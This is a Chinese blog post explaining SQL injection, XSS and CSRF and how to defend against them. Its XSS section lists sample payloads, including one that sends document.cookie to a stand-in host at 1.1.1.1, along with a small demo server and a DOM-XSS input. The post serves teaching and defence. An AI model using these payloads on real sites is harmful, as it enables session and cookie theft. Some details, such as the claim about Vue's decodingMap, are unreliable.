---
title: 常见的web攻击及防范
date: 2022-03-08 15:41:32
tags:
  - javascript
  - web
  - xss
  - csrf
categories:
  - FrontEnd-Tec
---

## SQL 注入

> 所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。

### 原理：

SQL 注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。

### 被攻击的原因:

> sql 语句伪造参数，然后在对参数进行拼接的后形成破坏性的 sql 语句，最后导致数据库受到攻击

### 防护：

- 永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双"-"进行转换等。
- 永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。
- 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。
- 不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。
- 应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装
- sql 注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用 sql 注入检测工具 jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN 等。采用 MDCSOFT-IPS 可以有效的防御 SQL 注入，XSS 攻击等。
- 7.使用预编译语句(PreparedStatement)，这样的话即使我们使用 sql 语句伪造成参数，到了服务端的时候，这个伪造 sql 语句的参数也只是简单的字符，并不能起到攻击的作用。

## 跨站脚本攻击(XSS)

### 原理

跨站脚本攻击（XSS，Cross-site scripting）是最常见和基本的攻击 WEB 网站的方法。攻击者在网页上发布包含攻击性代码的数据。当浏览者看到此网页时，特定的脚本就会以浏览者用户的身份和权限来执行。通过 XSS 可以比较容易地修改用户数据、窃取用户信息，以及造成其它类型的攻击，例如 CSRF 攻击

### 被攻击的原因

```
- <script>alert("反射型 XSS 攻击")</script>

- <script>alert(‘xss’)</script>

- <a href='' onclick=alert('xss')>type</a>

- <img src=http://1.1.1.1/a.jpg onerror=alert('xss')>

- <script>window.location=‘http://192.168.1.1'</script>

- <iframe SRC="http://1.1.1.1/a.jpg" height = "0" width ="0"></iframe>

- <script>new Image().src="http://1.1.1.1/c.php?output="+document.cookie;</script>
```

> 用户输入的数据变成了代码，比如说上面的 script,应该只是字符串却有了代码的作用。

### 三种方式

`反射型 XSS `

只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。

访问 localhost:3000 页面上的恶意链接,恶意链接的地址指向了 localhost:8001,我们启动一个 8001 的服务,这样就产生了反射型 XSS 攻击。攻击者可以注入任意的恶意脚本进行攻击，可能注入恶作剧脚本，或者注入能获取用户隐私数据(如 cookie)的脚本，这取决于攻击者的目的。

```

const http = require('http');
function handleReequest(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.writeHead(200, {'Content-Type': 'text/html; charset=UTF-8'});
    res.write('<script>alert("反射型 XSS 攻击")</script>');
    res.end();
}

const server = new http.Server();
server.listen(8001, '127.0.0.1');
server.on('request', handleReequest);
```

`存储型`

存储型 XSS 会把用户输入的数据 "存储" 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。

比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。

`基于DOM`

基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。

```
<h2>XSS: </h2>
<input type="text" id="input">
<button id="btn">Submit</button>
<div id="div"></div>
<script>
    const input = document.getElementById('input');
    const btn = document.getElementById('btn');
    const div = document.getElementById('div');

    let val;

    input.addEventListener('change', (e) => {
        val = e.target.value;
    }, false);

    btn.addEventListener('click', () => {
        div.innerHTML = `<a href=${val}>testLink</a>`
    }, false);
</script>
```

点击 Submit 按钮后，会在当前页面插入一个链接，其地址为用户的输入内容。如果用户在输入时构造了如下内容：

```
'' onclick=alert(/xss/)
```

用户提交之后，页面代码就变成了：

```
<a href onlick="alert(/xss/)">testLink</a>
```

![](https://user-images.githubusercontent.com/7871813/42721109-cb7ce572-8766-11e8-96d9-9ada8a787827.gif)

### 防护：

- 确保输出到 HTML 页面的数据以 HTML 的方式被转义
- 前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 <，>，script，防止 XSS 攻击：
- 设置 HttpOnly 严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。

```
// vuejs 中的 decodingMap
// 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉
const decodingMap = {
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&amp;': '&',
  '&#10;': '\n'
}
```

## 跨站请求伪造攻击（CSRF)

### 原理

跨站请求伪造（CSRF，Cross-site request forgery）是另一种常见的攻击。攻击者通过各种方法伪造一个请求，模仿用户提交表单的行为，从而达到修改用户的数据，或者执行特定任务的目的。为了假冒用户的身份，CSRF 攻击常常和 XSS 攻击配合起来做，但也可以通过其它手段，例如诱使用户点击一个包含攻击的链接

### 被攻击的原因：

- 用户本地存储 cookie，攻击者利用用户的 cookie 进行认证，然后伪造用户发出请求

- 之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的 cookie，那么如果我们不用 cookie 来验证不就可以预防了。所以我们可以采用 token（不存储于浏览器）认证，为每一个提交的表单生成一个随机 token， 存储在 session 中，每次验证表单 token，检查 token 是否正确。。
- 通过 referer 识别，HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行 A 网站才能进行转账了。

### 防护：

- 采用 POST 请求,增加攻击的难度.用户点击一个链接就可以发起 GET 类型的请求。而 POST 请求相对比较难，攻击者往往需要借助 javascript 才能实现
- 对请求进行认证，确保该请求确实是用户本人填写表单并提交的，而不是第三者伪造的.具体可以在会话中增加 token,确保看到信息和提交信息的是同一个人
